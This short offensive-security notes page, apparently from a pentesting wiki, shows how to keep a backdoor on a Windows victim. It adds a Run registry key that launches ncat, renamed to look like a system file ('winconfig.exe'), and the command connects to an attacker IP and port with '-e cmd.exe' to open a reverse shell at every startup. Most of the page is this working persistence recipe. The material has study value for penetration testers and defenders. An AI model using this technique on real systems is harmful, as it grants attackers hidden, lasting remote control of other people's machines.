---
title: Create a Registry
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - privilege escalation
---

# Create a Registry

Registries in the victim machine may be used to save a connection to the attacker machine.

### Regedit

```
Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

Right-Button > New > String value

We name it exactly like the ncat.exe file (if we renamed it to winconfig, then we call this registry winconfig>

We edit the registry and we add the path to the executable file and some commands  in the Value data:

“C:\Windows/System32\winconfig.exe <attacker IP> <port> -e cmd.exe”

For instance: “C:\Windows/System32\winconfig.exe 192.168.1.50 5540 -e cmd.exe”
```

### Python script that add a binary to the Registry

See [Making your binary persistent](python/making-your-binary-persistent.md)
